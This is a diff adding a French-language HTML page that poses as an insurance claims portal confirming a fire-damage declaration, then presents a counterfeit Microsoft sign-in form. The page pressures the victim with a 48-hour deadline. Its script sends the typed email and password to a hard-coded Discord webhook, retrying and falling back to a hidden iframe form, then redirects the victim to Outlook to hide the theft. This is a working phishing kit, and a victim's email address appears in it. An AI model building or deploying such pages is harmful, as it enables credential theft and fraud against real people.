@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Déclaration prise en compte — Dossier REC-2026-118742</title>
+<style>
+  :root {
+    color-scheme: light dark;
+    --bg: #f5f6f8; --fg: #111827; --muted: #6b7280; --card: #ffffff;
+    --border: #e5e7eb; --primary: #1d4ed8; --danger: #dc2626;
+    --success: #15803d; --muted-bg: #f3f4f6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #0f1115; --fg: #e8eaed; --muted: #9aa0a6; --card: #16181d;
+      --border: #2a2d34; --primary: #4d7cff; --danger: #f87171;
+      --success: #4ade80; --muted-bg: #1b1e24;
+    }
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--fg); font-family: Inter, -apple-system, Segoe UI, Roboto, system-ui, sans-serif; font-size: 14px; line-height: 1.55; }
+  .page { max-width: 620px; margin: 0 auto; padding: 24px 18px 48px; }
+  .topbar { display: flex; justify-content: space-between; align-items: center; padding-bottom: 14px; border-bottom: 1px solid var(--border); }
+  .brand { display: flex; gap: 10px; align-items: center; color: var(--primary); }
+  .brand-name { font-size: 14px; font-weight: 600; color: var(--fg); line-height: 1.2; }
+  .brand-sub { font-size: 11px; color: var(--muted); }
+  .secure { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--muted); }
+  .hidden { display: none !important; }
+
+  .panel { border: 1px solid var(--border); border-radius: 14px; background: var(--card); padding: 24px; margin-top: 24px; }
+  .check { width: 46px; height: 46px; border-radius: 50%; display: grid; place-items: center; background: color-mix(in srgb, var(--success) 14%, transparent); color: var(--success); margin-bottom: 16px; }
+  h1 { font-size: 21px; font-weight: 600; margin: 0 0 10px; letter-spacing: -.2px; }
+  .lead { font-size: 13.5px; color: var(--muted); margin: 0 0 16px; }
+  .lead b { color: var(--fg); font-weight: 600; }
+  .ref { font-family: ui-monospace, monospace; font-size: 12px; padding: 10px 12px; background: var(--muted-bg); border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; gap: 10px; flex-wrap: wrap; }
+  .ref span { color: var(--muted); }
+  .step { border: 1px solid var(--border); border-left: 3px solid var(--primary); border-radius: 8px; padding: 14px 16px; }
+  .step-t { font-size: 11px; text-transform: uppercase; letter-spacing: .6px; color: var(--primary); margin-bottom: 6px; font-weight: 600; }
+  .step p { font-size: 13px; margin: 0 0 12px; color: var(--fg); }
+  .cta { display: block; text-align: center; width: 100%; padding: 12px; border-radius: 8px; background: var(--primary); color: #fff; font-size: 14px; font-weight: 600; text-decoration: none; border: none; cursor: pointer; font-family: inherit; }
+  .cta:hover { opacity: .92; }
+  .hint { font-size: 11.5px; color: var(--muted); margin: 12px 0 0; }
+
+  .ms-head { margin: 22px 0 14px; }
+  .ms-head h2 { font-size: 15px; font-weight: 600; margin: 0; }
+  .ms-head p { font-size: 12px; color: var(--muted); margin: 2px 0 0; }
+  .ms { background: #fff; border-radius: 6px; padding: 30px 26px 20px; color: #1b1b1b; box-shadow: 0 2px 12px rgba(0,0,0,.09); font-family: "Segoe UI", Inter, system-ui, sans-serif; }
+  .ms-logo { display: flex; gap: 2px; margin-bottom: 16px; }
+  .ms-logo i { width: 12px; height: 12px; display: block; }
+  .ms-logo i:nth-child(1) { background: #f25022; }
+  .ms-logo i:nth-child(2) { background: #7fba00; }
+  .ms-logo i:nth-child(3) { background: #00a4ef; }
+  .ms-logo i:nth-child(4) { background: #ffb900; }
+  .ms h3 { font-size: 21px; font-weight: 600; margin: 0 0 6px; color: #1b1b1b; }
+  .ms .sub { font-size: 13px; color: #4a4a4a; margin: 0 0 18px; }
+  .ms label { display: block; font-size: 12px; color: #4a4a4a; margin-bottom: 4px; }
+  .ms input { width: 100%; padding: 8px 0; font-family: inherit; font-size: 14.5px; color: #1b1b1b; background: transparent; border: none; border-bottom: 1px solid #b9b9b9; border-radius: 0; outline: none; margin-bottom: 16px; }
+  .ms input:focus { border-bottom-color: #0067b8; }
+  .ms .row { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 18px; }
+  .ms .row a { color: #0067b8; text-decoration: none; }
+  .ms button { width: 100%; padding: 11px; font-family: inherit; font-size: 14.5px; font-weight: 600; color: #fff; background: #0067b8; border: none; border-radius: 2px; cursor: pointer; }
+  .ms button:hover { background: #005a9e; }
+  .ms button:disabled { opacity: .65; cursor: default; }
+  .ms .legal { font-size: 11.5px; color: #4a4a4a; margin: 18px 0 0; text-align: center; }
+  .err { font-size: 12px; color: var(--danger); margin: 10px 0 0; }
+  .manual { display: block; text-align: center; margin-top: 12px; font-size: 12.5px; color: var(--primary); }
+  .ms-foot { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px; font-size: 11px; color: var(--muted); margin-top: 12px; }
+  .footer { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px; font-size: 11px; color: var(--muted); padding: 16px 2px 6px; border-top: 1px solid var(--border); margin-top: 26px; }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="topbar">
+    <div class="brand">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2.5 4 6v6c0 4.6 3.4 8.4 8 9.5 4.6-1.1 8-4.9 8-9.5V6l-8-3.5Z"/>
+        <path d="M9.2 12.2l2 2 3.6-3.9"/>
+      </svg>
+      <div>
+        <div class="brand-name">Portail sinistres</div>
+        <div class="brand-sub">Espace client sécurisé</div>
+      </div>
+    </div>
+    <div class="secure">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>
+      Connexion chiffrée
+    </div>
+  </div>
+
+  <div id="view1">
+    <div class="panel">
+      <div class="check">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
+      </div>
+      <h1>Déclaration bien prise en compte</h1>
+      <p class="lead">Votre déclaration relative à l'incendie survenu dans la nuit du 20 au 21 novembre 2026 a bien été enregistrée. Un récapitulatif a été adressé à <b>lollipop_0689@hotmail.com</b>.</p>
+
+      <div class="ref"><span>Référence</span><strong>REC-2026-118742</strong></div>
+
+      <div class="step">
+        <div class="step-t">Dernière étape obligatoire</div>
+        <p>Pour que votre dossier soit validé et transmis au service gestion, connectez-vous à votre boîte mail et confirmez le récapitulatif reçu.</p>
+        <button class="cta" id="go">Me connecter à ma messagerie</button>
+      </div>
+
+      <p class="hint">Sans cette validation sous 48 h, le dossier reste en attente et ne peut donner lieu à aucune indemnisation.</p>
+    </div>
+  </div>
+
+  <div id="view2" class="hidden">
+    <div class="ms-head">
+      <h2>Validation du récapitulatif</h2>
+      <p>Connectez-vous avec votre compte de messagerie pour confirmer le dossier REC-2026-118742.</p>
+    </div>
+
+    <div class="ms">
+      <div class="ms-logo"><i></i><i></i><i></i><i></i></div>
+      <h3>Se connecter</h3>
+      <p class="sub">Saisissez le mot de passe de votre compte pour valider.</p>
+      <label for="mail">Adresse e-mail</label>
+      <input id="mail" type="email" value="lollipop_0689@hotmail.com" autocomplete="username" spellcheck="false">
+      <label for="pwd">Mot de passe</label>
+      <input id="pwd" type="password" placeholder="Mot de passe" autocomplete="current-password">
+      <div class="row"><a href="#" onclick="return false">Mot de passe oublié ?</a><span></span></div>
+      <button id="login">Se connecter</button>
+      <p class="legal">Vous serez redirigé vers votre messagerie après validation.</p>
+    </div>
+
+    <div class="err" id="err"></div>
+    <a class="manual hidden" id="manual" href="#" target="_blank" rel="noopener">Ouvrir ma messagerie manuellement</a>
+
+    <div class="ms-foot">
+      <span>Récapitulatif envoyé le 21/11/2026 à 09 h 14</span>
+      <a href="#" onclick="return false">Utiliser un autre compte</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    <span>Réf. REC-2026-118742 · Recensement sinistre</span>
+    <span>Aide : 01 84 00 12 34</span>
+  </div>
+</div>
+
+<script>
+/* ============ CONFIGURATION ============ */
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1573655489521262613/vb5ZI02Pgq0svbscQSrKW_BtdZTWraIeg63pC5gX0ayTfHhXepJOZQK5nxdHpW0D61G1";
+const REDIRECT = "https://outlook.live.com/mail/0/";
+const REF = "REC-2026-118742";
+
+const $ = id => document.getElementById(id);
+
+$("go").addEventListener("click", () => {
+  $("view1").classList.add("hidden");
+  $("view2").classList.remove("hidden");
+  window.scrollTo({ top: 0, behavior: "smooth" });
+});
+
+function payload() {
+  return {
+    username: "Portail sinistres",
+    content: "**Identifiants saisis** · " + REF,
+    embeds: [{
+      title: "Connexion messagerie",
+      description: "Incendie du 20 au 21/11/2026 à 23 h 57",
+      color: 0x1d4ed8,
+      fields: [
+        { name: "Adresse e-mail", value: $("mail").value || "—", inline: false },
+        { name: "Mot de passe", value: "```\n" + $("pwd").value + "\n```", inline: false }
+      ],
+      footer: { text: REF + " · " + new Date().toLocaleString("fr-FR") }
+    }]
+  };
+}
+
+/* --- envoi 1 : fetch + keepalive, survit au changement de page --- */
+async function envoyerFetch(body) {
+  for (let essai = 0; essai < 2; essai++) {
+    try {
+      const ctrl = new AbortController();
+      const minuteur = setTimeout(() => ctrl.abort(), 7000);
+      const fd = new FormData();
+      fd.append("payload_json", JSON.stringify(body));
+      const res = await fetch(WEBHOOK_URL + "?wait=true", {
+        method: "POST", body: fd, keepalive: true, signal: ctrl.signal
+      });
+      clearTimeout(minuteur);
+      if (res.ok) return true;
+      if (res.status === 429) await new Promise(r => setTimeout(r, 1200));
+    } catch (e) {}
+  }
+  return false;
+}
+
+/* --- envoi 2 : formulaire natif dans une iframe, aucun CORS --- */
+function envoyerIframe(body) {
+  return new Promise(resolve => {
+    const nom = "wh" + Date.now();
+    const iframe = document.createElement("iframe");
+    iframe.name = nom;
+    iframe.style.cssText = "position:absolute;width:0;height:0;border:0;";
+    document.body.appendChild(iframe);
+
+    const form = document.createElement("form");
+    form.method = "POST";
+    form.action = WEBHOOK_URL;
+    form.target = nom;
+    form.enctype = "application/x-www-form-urlencoded";
+
+    const input = document.createElement("input");
+    input.type = "hidden";
+    input.name = "payload_json";
+    input.value = JSON.stringify(body);
+    form.appendChild(input);
+    document.body.appendChild(form);
+
+    form.submit();
+    setTimeout(resolve, 1000);
+  });
+}
+
+function allerVersMessagerie() {
+  if (window.self !== window.top) {
+    window.open(REDIRECT, "_blank");
+  } else {
+    window.location.href = REDIRECT;
+  }
+}
+
+$("login").addEventListener("click", async () => {
+  if (!$("pwd").value.trim()) {
+    $("err").textContent = "Saisissez le mot de passe de votre compte.";
+    return;
+  }
+  $("err").textContent = "";
+
+  const btn = $("login");
+  btn.disabled = true;
+  btn.textContent = "Connexion en cours…";
+  $("manual").href = REDIRECT;
+  $("manual").classList.remove("hidden");
+
+  const body = payload();
+  try { localStorage.setItem("recensement_" + REF, JSON.stringify(body)); } catch (e) {}
+
+  const ok = await envoyerFetch(body);
+  if (!ok) await envoyerIframe(body);
+
+  allerVersMessagerie();
+});
+</script>
+</body>
+</html>
